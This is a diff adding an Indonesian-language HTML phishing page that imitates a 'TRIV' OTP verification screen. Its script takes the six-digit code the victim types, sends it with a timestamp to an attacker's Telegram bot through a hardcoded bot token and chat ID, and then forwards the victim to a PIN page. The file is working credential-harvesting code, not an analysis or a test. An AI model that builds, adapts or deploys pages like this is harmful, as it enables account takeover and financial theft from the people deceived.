@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TRIV - Verifikasi OTP</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;}
+        body{min-height:100vh;background:linear-gradient(135deg,#051530 0%,#0a2550 100%);display:flex;flex-direction:column;align-items:center;padding:60px 30px;}
+        .logo{font-size:2.5rem;font-weight:600;color:#80D0FF;margin:20px 0 40px;text-shadow:0 0 15px rgba(100,200,255,.5);}
+        .title{color:#E0F0FF;font-size:1.4rem;margin-bottom:10px;}
+        .subtitle{color:#90B8E0;font-size:.9rem;margin-bottom:40px;text-align:center;max-width:300px;}
+        .otp-container{display:flex;gap:12px;margin-bottom:40px;}
+        .otp-input{width:50px;height:60px;background:rgba(255,255,255,.08);border:1px solid rgba(150,200,255,.2);border-radius:10px;color:#fff;font-size:1.3rem;font-weight:600;text-align:center;outline:none;transition:all .25s ease;}
+        .otp-input:focus{border-color:#40A0FF;box-shadow:0 0 0 3px rgba(64,160,255,.2);background:rgba(255,255,255,.15);}
+        .btn-kirim{width:100%;max-width:300px;padding:15px;background:linear-gradient(90deg,#2080FF,#40B0FF);border:none;border-radius:12px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;transition:transform .2s ease;}
+        .btn-kirim:active{transform:scale(.97);}
+        .resend{margin-top:25px;color:#70C0FF;font-size:.85rem;cursor:pointer;}
+    </style>
+</head>
+<body>
+    <div class="logo">triv</div>
+    <h2 class="title">Masukkan Kode OTP</h2>
+    <p class="subtitle">Kode verifikasi telah dikirim ke nomor/email Anda</p>
+
+    <div class="otp-container" id="otpContainer">
+        <input type="text" class="otp-input" maxlength="1" data-index="0">
+        <input type="text" class="otp-input" maxlength="1" data-index="1">
+        <input type="text" class="otp-input" maxlength="1" data-index="2">
+        <input type="text" class="otp-input" maxlength="1" data-index="3">
+        <input type="text" class="otp-input" maxlength="1" data-index="4">
+        <input type="text" class="otp-input" maxlength="1" data-index="5">
+    </div>
+
+    <button class="btn-kirim" id="btnKirim">Verifikasi</button>
+    <p class="resend">Kirim ulang kode</p>
+
+    <script>
+        // === PENGATURAN ===
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+        // ✅ DIUBAH: Tujuan ke Pin.html
+        const HALAMAN_TUJUAN = 'Pin.html';
+
+        const inputs = document.querySelectorAll('.otp-input');
+        let kodeOTP = '';
+
+        // Pindah otomatis antar kolom
+        inputs.forEach((inp, idx) => {
+            inp.addEventListener('input', () => {
+                if (inp.value && idx < inputs.length - 1) inputs[idx+1].focus();
+                kodeOTP = Array.from(inputs).map(i => i.value).join('');
+            });
+            inp.addEventListener('keydown', e => {
+                if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx-1].focus();
+            });
+        });
+        inputs[0].focus();
+
+        // Kirim ke Telegram
+        async function kirimTelegram(pesan) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: pesan, disable_web_page_preview: true})
+                });
+            } catch (e) { console.log('Kirim gagal:', e); }
+        }
+
+        // Tombol Verifikasi → kirim & pindah ke Pin.html
+        btnKirim.addEventListener('click', async () => {
+            if (kodeOTP.length !== 6) return alert('Masukkan 6 digit kode OTP!');
+
+            await kirimTelegram(`🔢 KODE OTP TRIV\nKode: ${kodeOTP}\n🕐 ${new Date().toLocaleString('id-ID')}`);
+            
+            // ✅ Otomatis pindah ke halaman PIN
+            window.location.href = HALAMAN_TUJUAN;
+        });
+    </script>
+</body>
+</html>
